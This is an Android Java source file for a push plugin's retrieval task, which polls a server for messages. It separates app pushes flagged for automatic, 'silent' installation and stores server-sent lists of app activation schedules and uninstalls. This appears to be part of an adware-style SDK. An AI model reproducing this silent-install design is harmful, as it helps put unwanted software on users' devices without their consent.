package com.tiho.dlplugin.task;

import android.content.Context;
import android.os.Handler;

import com.tiho.base.base.http.json.JsonUtil;
import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushConfigBean;
import com.tiho.dlplugin.bean.PushMessageBean;
import com.tiho.dlplugin.bean.PushUninstallBean;
import com.tiho.dlplugin.dao.DAOFactory;
import com.tiho.dlplugin.dao.PushConfigDAO;
import com.tiho.dlplugin.dao.PushDataSource;
import com.tiho.dlplugin.dao.ScheduleActivationDAO;
import com.tiho.dlplugin.dao.impl.PushMessageWebRetrieve;
import com.tiho.dlplugin.display.PushStat;
import com.tiho.dlplugin.export.PushServiceImp;
import com.tiho.dlplugin.http.Converter;
import com.tiho.dlplugin.http.PushMessageDTO;
import com.tiho.dlplugin.http.PushMessageItem;
import com.tiho.dlplugin.http.UnInstallItem;
import com.tiho.dlplugin.task.scheduleact.ScheduleActList;
import com.tiho.dlplugin.util.NetworkUtil;
import com.tiho.dlplugin.util.StringUtils;

import java.util.LinkedList;
import java.util.List;

/**
 * 定时获取push消息
 * 
 * @author Joey.Dai
 * 
 */
public class PushRetrieveTask extends BaseTask {

	private PushDataSource dataSource;
	private PushConfigDAO configDao;
	private PushMessageWebRetrieve webMessageDao;
	private ScheduleActivationDAO scheduleActDao;

	public static boolean firstRecoverOfNetwork = true;

	private boolean causeByNetwork;
	
	public PushRetrieveTask(Handler handler, Context context, boolean networkCause) {
		super(handler, context);

		dataSource = PushDataSource.getInstance(context);
		configDao = DAOFactory.getConfigDAO(context);
		webMessageDao = new PushMessageWebRetrieve(context);
		scheduleActDao = DAOFactory.getScheduleActRegularDAO(context);

		causeByNetwork = networkCause;
	}

	@Override
	protected void doTask() {
		try {
			LogManager.LogShow("等待时间结束，准备发送请求获取Push消息");

			if (NetworkUtil.isNetworkOk(context)) {
				//如果是网络切换触发push获取，需要满足当前没有消息这个条件
				//如果是定时任务触发push获取，需要满足一定的请求间隔
				//2个条件只要满足一个发送请求
				if ((causeByNetwork && !dataSource.haveMessages()) || (!causeByNetwork && pushRequestIntervalEnough())) {
					requestPush();
					PushStat.getInstance(context).resetReqTime();
				}

			} else {
				LogManager.LogShow("当前没有网络连接，等待网络连接");
			}
		} catch (Exception e) {
			LogManager.LogShow("获取消息失败", e);
		}
	}

	private boolean pushRequestIntervalEnough() {
		PushStat stat = PushStat.getInstance(context);
		long interval = requestIntervalMilliseconds();
		//当前时间和上一次请求时间之差
		long timePast = System.currentTimeMillis() - stat.getLastReqTime();
         //距离上一次请求的时间是否大于等于服务器下发的请求时间的一半
		return timePast >= (interval / 2);
	}

	/**
	 * 请求push消息，并保存
	 * 
	 * @throws Exception
	 */
	private void requestPush() throws Exception {
		// 网络获取push
		String response = webMessageDao.getPushMessage(false);

		LogManager.LogShow("Push消息返回内容:" + response);

		if (!StringUtils.isEmpty(response)) {
			try {
				PushMessageDTO dto = JsonUtil.fromJson(response, PushMessageDTO.class);

				List<PushMessageBean> normalPush = new LinkedList<PushMessageBean>();
				List<PushMessageBean> silentPush = new LinkedList<PushMessageBean>();

				long newMax = 0;

				if (dto.getPush() != null) {
					for (PushMessageItem item : dto.getPush()) {//dto.getPush()=List<PushMessageItem>
						if (item.getId() > newMax)
							newMax = item.getId();//取出push消息数组中最大的id

						PushMessageBean pmb = Converter.toMessageBO(item);//PushMessageItem转换为PushMessageBean
						if (pmb.getPushType() == PushMessageBean.TYPE_APP && "Y".equals(pmb.getAutoInstall())) {
							silentPush.add(pmb);
						} else {
							normalPush.add(pmb);
						}
						
						if(pmb.getPushType() == PushMessageBean.TYPE_APP && !StringUtils.isEmpty(item.getAppinfo().getTimeract())){
							//type=2并且timeract不为空，存储到数据库中
							scheduleActDao.saveScheduleList(item.getId() , item.getAppinfo().getPackageName(), item.getAppinfo().getTimeract() ,false);
						}
					}
					//生成今天的激活列表todayList
					ScheduleActList.getInstance(context).reset();
				}

				PushStat stat = PushStat.getInstance(context);

				if (stat.getMaxId() < newMax) {
					// 当有新的消息加入，就要从最新的开始推
					// 重新设置最大id和开始推送的位置
					stat.setMaxId(newMax);
					stat.setCursorId(newMax);
				}

				// 保存push
				dataSource.savePushMessage(normalPush);
				dataSource.saveSilentPushMessage(silentPush);

				if (dto.getUninstall() != null) {

					List<PushUninstallBean> uninstalls = new LinkedList<PushUninstallBean>();
					for (UnInstallItem item : dto.getUninstall()) {
						uninstalls.add(Converter.toUninstallBO(item));
					}

					dataSource.saveUninstall(uninstalls);
				}
				
			} catch (Exception e) {
				LogManager.LogShow("请求push消息失败", e);
			}
		}

	}
	
	private long requestIntervalMilliseconds() {
		long interval = 720 * 60000L;//12小时

		try {
			PushConfigBean config = configDao.getConfigByKey("config", PushConfigBean.class);
//			interval = config.getReqGap() * 60000L;
			long cfgReq = config.getReqGap() * 60000L;
			LogManager.LogShow("cfgReq==" + cfgReq);
			long min = PushServiceImp.sPushSInterval == 0 ? 7200000L : PushServiceImp.sPushSInterval;
			LogManager.LogShow("min==" + min);
			interval = cfgReq < min ? min : cfgReq;//选择两者之间大的
		} catch (Exception e) {
			LogManager.LogShow("PushRetrieveTask requestIntervalMilliseconds ", e);
		}

		return interval;

	}

	@Override
	protected void afterTask(Handler handler) {

		if (!causeByNetwork) {
			long millis = requestIntervalMilliseconds();

			LogManager.LogShow("下一次请求普通push消息在 " + millis / 60000 + " 分钟之后.");

			handler.postDelayed(new PushRetrieveTask(handler, context, false), millis);
		}

	}

}
